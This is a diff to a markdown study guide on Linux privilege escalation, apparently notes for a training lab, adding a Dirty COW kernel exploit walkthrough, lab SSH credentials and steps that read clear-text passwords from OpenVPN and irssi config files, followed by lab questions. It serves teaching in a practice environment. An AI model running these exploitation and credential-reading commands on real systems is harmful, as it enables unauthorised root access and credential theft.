@@ -3,6 +3,7 @@
 ## Table of Contents
 
 - [Table of Contents](#table-of-contents)
+- [Other Resources](#other-resources)
 - [Initial checklist](#initial-checklist)
 - [SUID/GUID](#suidguid)
   - [Find the exploitable binary(ies)](#find-the-exploitable-binaryies)
@@ -32,7 +33,15 @@
   - [Alter the PATH variable](#alter-the-path-variable)
   - [Run the script file](#run-the-script-file)
 - [Kernel Exploits](#kernel-exploits)
+  - [Detection](#detection)
+  - [Exploitation](#exploitation)
+- [Stored Passwords (Config Files)](#stored-passwords-config-files)
+  - [Stored Password Questions](#stored-password-questions)
 
+## Other Resources
+
+[Sagi Shahar's privesc workshop](https://github.com/sagishahar/lpeworkshop)  
+[The Cyber Mentor's Linux Privilege Escalation Udemy course](http://udemy.com/course/linux-privilege-escalation-for-beginners).
 
 ## Initial checklist
 
@@ -205,4 +214,55 @@ Achieve root shell
 
 ![root](assets/Linux-PrivEsc-09-path-04.png)  
 
+# Linux PrivEsc Arena
+
+All tools needed to complete this course are in the user folder (/home/user/tools).
+
+Let's first connect to the machine. SSH is open on port 22. Your credentials are:
+
+username: TCM
+password: Hacker123  
+
 ## Kernel Exploits
+
+### Detection
+
+Linux VM
+
+1. In command prompt type:
+/home/user/tools/linux-exploit-suggester/linux-exploit-suggester.sh
+2. From the output, notice that the OS is vulnerable to “dirtycow”.
+
+### Exploitation
+
+Linux VM
+
+1. In command prompt type:
+gcc -pthread /home/user/tools/dirtycow/c0w.c -o c0w
+2. In command prompt type: ./c0w
+
+Disclaimer: This part takes 1-2 minutes - Please allow it some time to work.
+
+3. In command prompt type: passwd
+4. In command prompt type: id
+
+From here, either copy /tmp/passwd back to /usr/bin/passwd or reset your machine to undo changes made to the passwd binary
+
+## Stored Passwords (Config Files)
+
+**Exploitation**
+
+Linux VM
+
+1. In command prompt type: cat /home/user/myvpn.ovpn
+2. From the output, make note of the value of the “auth-user-pass” directive.
+3. In command prompt type: cat /etc/openvpn/auth.txt
+4. From the output, make note of the clear-text credentials.
+5. In command prompt type: cat /home/user/.irssi/config | grep -i passw
+6. From the output, make note of the clear-text credentials.
+
+### Stored Password Questions 
+
+What password did you find?
+
+What user's credentials were exposed in the OpenVPN auth file?
